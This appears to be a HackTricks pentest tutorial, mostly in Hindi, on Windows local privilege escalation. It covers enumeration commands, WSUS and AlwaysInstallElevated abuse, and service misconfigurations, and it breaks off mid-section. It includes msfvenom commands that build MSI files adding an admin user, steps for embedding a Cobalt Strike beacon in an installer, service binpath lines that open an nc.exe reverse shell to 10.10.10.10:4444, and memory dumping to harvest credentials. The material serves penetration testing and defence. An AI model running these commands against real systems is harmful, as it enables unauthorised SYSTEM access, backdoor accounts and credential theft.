# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## प्रारंभिक Windows सिद्धांत

### Access Tokens

**यदि आप नहीं जानते कि Windows Access Tokens क्या हैं, तो जारी रखने से पहले निम्नलिखित पृष्ठ पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्नलिखित पृष्ठ देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**यदि आप नहीं जानते कि Windows में integrity levels क्या हैं, तो जारी रखने से पहले निम्नलिखित पृष्ठ पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows में ऐसी अलग‑अलग चीजें हैं जो आपको enumerating the system से रोक सकती हैं, executables चलाने से रोक सकती हैं या आपकी activities का detect भी कर सकती हैं। आपको निम्नलिखित पृष्ठ पढ़ना चाहिए और privilege escalation enumeration शुरू करने से पहले इन सभी defenses mechanisms को enumerate करना चाहिए:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## System Info

### Version info enumeration

जांचें कि Windows का version किसी ज्ञात vulnerability के प्रभाव में तो नहीं है (लागू किए गए patches भी जांचें).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

यह [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft सुरक्षा कमजोरियों के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। इस डेटाबेस में 4,700 से अधिक सुरक्षा कमजोरियाँ हैं, जो Windows environment द्वारा प्रस्तुत **massive attack surface** को दर्शाती हैं।

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas में watson embedded है)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या कोई credential/Juicy info env variables में saved है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell ट्रांसक्रिप्ट फ़ाइलें

आप यह कैसे चालू करें, जानने के लिए देखें: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell पाइपलाइन निष्पादन का विवरण रिकॉर्ड किया जाता है, जिसमें निष्पादित कमांड, कमांड इनवोकेशन्स और स्क्रिप्ट के हिस्से शामिल हैं। हालाँकि, पूरा निष्पादन विवरण और आउटपुट परिणाम कैप्चर नहीं किए जा सकते।

इसे सक्षम करने के लिए, दस्तावेज़ीकरण के "Transcript files" सेक्शन में दिए निर्देशों का पालन करें, और **"Module Logging"** को **"Powershell Transcription"** के बजाय चुनें।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell लॉग्स से अंतिम 15 इवेंट देखने के लिए आप निम्नलिखित कमांड चला सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

स्क्रिप्ट के निष्पादन की पूरी गतिविधि और समग्र सामग्री रिकॉर्ड की जाती है, जिससे हर कोड ब्लॉक उसके चलने के समय दर्ज होता है। यह प्रत्येक गतिविधि का व्यापक ऑडिट ट्रेल सुरक्षित रखता है, जो फ़ॉरेंसिक और दुर्भावनापूर्ण व्यवहार के विश्लेषण के लिए मूल्यवान है। निष्पादन के समय सभी गतिविधियों को दस्तावेज़ित करने से प्रक्रिया के बारे में विस्तृत जानकारी मिलती है।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लॉगिंग इवेंट्स को Windows Event Viewer में निम्न पथ पर पाया जा सकता है: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
पिछले 20 इवेंट्स देखने के लिए आप उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

आप compromise the system कर सकते हैं यदि अपडेट्स http**S** के बजाय http के माध्यम से अनुरोध किए जा रहे हैं।

आप यह जांचकर शुरू करते हैं कि नेटवर्क non-SSL WSUS update का उपयोग कर रहा है या नहीं, cmd में निम्नलिखित चलाकर:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
यदि आपको इनमें से किसी तरह का उत्तर मिलता है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **यह एक्सप्लॉयटेबल है।** यदि अंतिम रजिस्ट्री की मान 0 के बराबर है, तो WSUS एंट्री को इग्नोर कर दिया जाएगा।

In order to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
सारतः, यह वही कमजोरी है जिसका यह बग फायदा उठाता है:

> यदि हमारे पास अपने स्थानीय उपयोगकर्ता प्रॉक्सी को संशोधित करने की शक्ति है, और Windows Updates Internet Explorer की सेटिंग्स में कॉन्फ़िगर किए गए प्रॉक्सी का उपयोग करता है, तो हमारे पास लोकली [PyWSUS](https://github.com/GoSecure/pywsus) चलाने की शक्ति होगी ताकि हम अपनी खुद की ट्रैफ़िक को इंटरसेप्ट कर सकें और अपने एसेट पर एक elevated उपयोगकर्ता के रूप में कोड चला सकें।
>
> इसके अलावा, चूंकि WSUS सेवा वर्तमान उपयोगकर्ता की सेटिंग्स का उपयोग करती है, यह उसके certificate store का भी उपयोग करेगी। यदि हम WSUS hostname के लिए एक self-signed certificate जनरेट करते हैं और उस certificate को वर्तमान उपयोगकर्ता के certificate store में जोड़ते हैं, तो हम HTTP और HTTPS दोनों WSUS ट्रैफ़िक को इंटरसेप्ट करने में सक्षम होंगे। WSUS किसी HSTS-जैसी मेकैनिज्म का उपयोग नहीं करता है ताकि certificate पर trust-on-first-use प्रकार की वैरिफिकेशन लागू की जा सके। यदि प्रस्तुत किया गया certificate उपयोगकर्ता द्वारा trusted है और सही hostname है, तो सेवा इसे स्वीकार कर लेगी।

आप इस vulnerability का exploit टूल [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) का उपयोग करके कर सकते हैं (जब यह उपलब्ध हो)।

## Third-Party Auto-Updaters and Agent IPC (local privesc)

कई एंटरप्राइज़ एजेंट्स एक localhost IPC सतह और एक privileged update चैनल एक्सपोज़ करते हैं। यदि enrollment को एक अटैकर सर्वर की ओर मजबूर किया जा सकता है और updater किसी rogue root CA या कमजोर signer checks पर भरोसा करता है, तो एक स्थानीय उपयोगकर्ता एक malicious MSI प्रदान कर सकता है जिसे SYSTEM सेवा इंस्टॉल कर देती है। यहां एक सामान्यीकृत तकनीक देखें (Netskope stAgentSvc chain – CVE-2025-0309 पर आधारित):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Windows **domain** वातावरण में विशेष स्थितियों के तहत एक **local privilege escalation** vulnerability मौजूद है। इन स्थितियों में वे वातावरण शामिल हैं जहाँ **LDAP signing लागू नहीं है**, उपयोगकर्ताओं के पास ऐसे अधिकार हैं जो उन्हें **Resource-Based Constrained Delegation (RBCD)** कॉन्फ़िगर करने की अनुमति देते हैं, और डोमेन में कंप्यूटर बनाने की क्षमता होती है। यह महत्वपूर्ण है कि ये **आवश्यकताएँ** डिफ़ॉल्ट सेटिंग्स का उपयोग करते हुए पूरी हो जाती हैं।

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**यदि** ये 2 रजिस्ट्री कुंजियाँ **सक्रिय** हैं (मान **0x1**), तो किसी भी अधिकार वाला उपयोगकर्ता NT AUTHORITY\\**SYSTEM** के रूप में `*.msi` फ़ाइलें **इंस्टॉल** (execute) कर सकता है।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास meterpreter session है, तो आप इस तकनीक को मॉड्यूल **`exploit/windows/local/always_install_elevated`** का उपयोग करके स्वचालित कर सकते हैं

### PowerUP

power-up से `Write-UserAddMSI` कमांड का उपयोग करें ताकि वर्तमान निर्देशिका में privileges बढ़ाने के लिए एक Windows MSI binary बनाई जा सके। यह script एक precompiled MSI installer लिखता है जो user/group जोड़ने के लिए prompt करता है (इसलिए आपको GIU access की आवश्यकता होगी):
```
Write-UserAddMSI
```
बस बनाए गए बाइनरी को चलाएँ ताकि आप escalate privileges कर सकें।

### MSI Wrapper

इस ट्यूटोरियल को पढ़ें ताकि आप यह सीख सकें कि इन tools का उपयोग करके MSI wrapper कैसे बनाया जाए। ध्यान दें कि आप एक "**.bat**" फ़ाइल को wrap कर सकते हैं यदि आप केवल **command lines** को **execute** करना चाहते हैं


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** करें Cobalt Strike या Metasploit के साथ एक **new Windows EXE TCP payload** को `C:\privesc\beacon.exe` में
- **Visual Studio** खोलें, **Create a new project** चुनें और सर्च बॉक्स में "installer" टाइप करें। **Setup Wizard** प्रोजेक्ट चुनें और **Next** पर क्लिक करें।
- प्रोजेक्ट को एक नाम दें, जैसे **AlwaysPrivesc**, लोकेशन के लिए **`C:\privesc`** उपयोग करें, **place solution and project in the same directory** चुनें, और **Create** पर क्लिक करें।
- तब तक **Next** पर क्लिक करते रहें जब तक आप step 3 of 4 (choose files to include) पर नहीं पहुँच जाते। **Add** पर क्लिक करें और वह Beacon payload चुनें जिसे आपने अभी जनरेट किया। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** प्रोजेक्ट को हाइलाइट करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
- अन्य properties भी हैं जिन्हें आप बदल सकते हैं, जैसे **Author** और **Manufacturer** जो इंस्टॉल किए गए ऐप को अधिक वैध दिखा सकते हैं।
- प्रोजेक्ट पर राइट-क्लिक करें और **View > Custom Actions** चुनें।
- **Install** पर राइट-क्लिक करें और **Add Custom Action** चुनें।
- **Application Folder** पर डबल-क्लिक करें, अपनी **beacon.exe** फ़ाइल चुनें और **OK** पर क्लिक करें। इससे यह सुनिश्चित होगा कि installer चलने पर beacon payload तुरंत execute हो जाएगा।
- **Custom Action Properties** के तहत **Run64Bit** को **True** में बदलें।
- अंत में, **build it**।
- यदि चेतावनी `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे, तो सुनिश्चित करें कि आपने platform को x64 पर सेट किया है।

### MSI Installation

मैलिशियस `.msi` फ़ाइल की **installation** को **background** में execute करने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
इस भेद्यता का शोषण करने के लिए आप उपयोग कर सकते हैं: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### ऑडिट सेटिंग्स

ये सेटिंग्स तय करती हैं कि क्या **लॉग** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए।
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — यह जानना दिलचस्प है कि logs कहाँ भेजे जाते हैं
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** का उद्देश्य domain से जुड़े कंप्यूटर्स पर local Administrator पासवर्ड्स के प्रबंधन के लिए बनाया गया है, यह सुनिश्चित करते हुए कि प्रत्येक पासवर्ड **अद्वितीय, यादृच्छिक, और नियमित रूप से अपडेट** किया जाता है। ये पासवर्ड सुरक्षित रूप से Active Directory में संग्रहीत होते हैं और केवल उन उपयोगकर्ताओं द्वारा एक्सेस किए जा सकते हैं जिन्हें ACLs के माध्यम से पर्याप्त अनुमतियाँ दी गई हों, ताकि वे अधिकृत होने पर local admin पासवर्ड देख सकें।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि सक्रिय है, तो **plain-text passwords LSASS में स्टोर होते हैं** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA सुरक्षा

**Windows 8.1** से शुरू होकर, Microsoft ने Local Security Authority (LSA) के लिए उन्नत सुरक्षा पेश की ताकि अविश्वसनीय प्रक्रियाओं द्वारा **इसकी मेमोरी पढ़ने** या कोड इंजेक्ट करने के प्रयासों को **रोककर**, सिस्टम और अधिक सुरक्षित बनाया जा सके।\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection)
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य डिवाइस पर संग्रहीत credentials को pass-the-hash जैसे खतरों से सुरक्षित रखना है.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** का प्रमाणीकरण **Local Security Authority** (LSA) द्वारा किया जाता है और इन्हें ऑपरेटिंग सिस्टम के घटक उपयोग करते हैं। जब किसी उपयोगकर्ता के लॉगऑन डेटा को किसी पंजीकृत सुरक्षा पैकेज द्वारा प्रमाणित किया जाता है, तो आम तौर पर उस उपयोगकर्ता के लिए domain credentials स्थापित हो जाते हैं।\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## उपयोगकर्ता और समूह

### उपयोगकर्ताओं और समूहों को सूचीबद्ध करें

आपको यह जांचना चाहिए कि जिन समूहों का आप हिस्सा हैं उनमें से किसी के पास रोचक अनुमतियाँ हैं।
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### विशेषाधिकार समूह

यदि आप **किसी विशेषाधिकार समूह के सदस्य हैं तो आप विशेषाधिकार बढ़ा सकते हैं**। विशेषाधिकार समूहों और उन्हें दुरुपयोग करके विशेषाधिकार कैसे बढ़ाएं, के बारे में यहाँ जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**अधिक जानें** कि एक **token** क्या है इस पृष्ठ पर: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
निम्नलिखित पृष्ठ देखें ताकि आप **रोचक tokens के बारे में जानें** और उन्हें दुरुपयोग कैसे करें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### लॉग इन उपयोगकर्ता / सत्र
```bash
qwinsta
klist sessions
```
### होम फ़ोल्डर्स
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```bash
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## चल रहे प्रोसेस

### फ़ाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, प्रक्रियाओं को सूचीबद्ध करते समय **प्रोसेस की कमांड लाइन में पासवर्ड हैं या नहीं जांचें**.\
जांचें कि क्या आप **overwrite some binary running** कर सकते हैं या binary folder पर आपकी **write permissions** हैं ताकि आप संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) को exploit कर सकें:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा संभावित [**electron/cef/chromium debuggers** चल रहे हैं, आप इसका दुरुपयोग कर के escalate privileges कर सकते हैं](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**प्रोसेस के binaries के permissions की जाँच**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**processes binaries के फ़ोल्डर्स की permissions की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

आप sysinternals के **procdump** का उपयोग करके किसी चल रहे प्रोसेस का मेमोरी डंप बना सकते हैं। FTP जैसी सेवाओं की मेमोरी में अक्सर **credentials in clear text in memory** होते हैं; मेमोरी को डंप करके credentials पढ़ने की कोशिश करें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI ऐप्स

**SYSTEM के रूप में चलने वाले Applications एक उपयोगकर्ता को CMD लॉन्च करने या निर्देशिकाओं को ब्राउज़ करने की अनुमति दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## सेवाएं

Service Triggers Windows को तब एक service शुरू करने की अनुमति देते हैं जब कुछ शर्तें पूरी हों (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, आदि)। SERVICE_START rights के बिना भी आप अक्सर उनके triggers को फायर करके privileged services शुरू कर सकते हैं। enumeration और activation techniques यहाँ देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

सेवाओं की सूची प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप किसी service की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं।
```bash
sc qc <service_name>
```
यह अनुशंसित है कि हर सेवा के लिए आवश्यक privilege level की जाँच करने के लिए _Sysinternals_ का binary **accesschk** मौजूद हो।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
यह अनुशंसा की जाती है कि यह जांचा जाए कि "Authenticated Users" किसी सेवा को संशोधित कर सकते हैं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आपको यह त्रुटि आ रही है (उदाहरण के लिए SSDPSRV के साथ):

_सिस्टम त्रुटि 1058 हुई है._\
_यह सेवा शुरू नहीं की जा सकती, या तो इसलिए कि यह निष्क्रिय है या क्योंकि इसके साथ कोई सक्षम डिवाइस संबद्ध नहीं है._

आप इसे निम्न का उपयोग करके सक्षम कर सकते हैं:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान रखें कि सेवा upnphost काम करने के लिए SSDPSRV पर निर्भर करती है (XP SP1 के लिए)**

**एक अन्य उपाय** इस समस्या के लिए इसे चलाना है:
```
sc.exe config usosvc start= auto
```
### **सर्विस बाइनरी पथ संशोधित करें**

ऐसे परिदृश्य में जहाँ "Authenticated users" समूह के पास किसी service पर **SERVICE_ALL_ACCESS** होता है, उस service के executable बाइनरी को संशोधित करना संभव है। बाइनरी संशोधित करने और **sc** चलाने के लिए:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनरारंभ करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges विभिन्न अनुमतियों के माध्यम से escalate किए जा सकते हैं:

- **SERVICE_CHANGE_CONFIG**: सेवा बाइनरी को पुनः कॉन्फ़िगर करने की अनुमति देता है।
- **WRITE_DAC**: अनुमतियों के पुनः कॉन्फ़िगरेशन को सक्षम बनाता है, जिससे सेवा विन्यास बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: स्वामित्व प्राप्त करने और अनुमतियों को पुनः कॉन्फ़िगर करने की अनुमति देता है।
- **GENERIC_WRITE**: सेवा विन्यास बदलने की क्षमता विरासत में प्राप्त करता है।
- **GENERIC_ALL**: सेवा विन्यास बदलने की क्षमता भी विरासत में प्राप्त करता है।

इस कमजोरियों का पता लगाने और इसका शोषण करने के लिए _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services binaries weak permissions

**जाँचें कि क्या आप उस बाइनरी को संशोधित कर सकते हैं जिसे एक सेवा द्वारा चलाया जाता है** या क्या आपके पास **फोल्डर पर लिखने की अनुमति** है जहाँ बाइनरी स्थित है ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
आप किसी सेवा द्वारा चलाई जाने वाली हर बाइनरी को **wmic** का उपयोग करके प्राप्त कर सकते हैं (system32 में नहीं) और अपनी अनुमतियों को **icacls** का उपयोग करके जांच सकते हैं:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** का भी उपयोग कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### सर्विस रजिस्ट्री संशोधन की अनुमति

आपको यह जांचना चाहिए कि क्या आप किसी भी सर्विस रजिस्ट्री को संशोधित कर सकते हैं.\
आप किसी सर्विस **रजिस्ट्री** पर अपनी **अनुमतियाँ** को **जाँच** करके कर सकते हैं:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
यह जांचना चाहिए कि क्या **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` permissions हैं। यदि हाँ, तो service द्वारा निष्पादित किए जाने वाले binary को बदला जा सकता है।

service द्वारा निष्पादित binary के Path को बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

यदि आपके पास किसी registry पर यह permission है, तो इसका मतलब है कि **आप इस registry से उप-रजिस्ट्री बना सकते हैं**। Windows services के मामले में यह **arbitrary code चलाने के लिए पर्याप्त है:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि किसी executable का path quotes में नहीं है, तो Windows space से पहले के हर ending को execute करने की कोशिश करेगा।

उदाहरण के लिए, path _C:\Program Files\Some Folder\Service.exe_ के लिए Windows निम्न चीज़ों को execute करने की कोशिश करेगा:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
बिल्ट-इन Windows services से संबंधित न होने वाले सभी unquoted service paths सूचीबद्ध करें:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
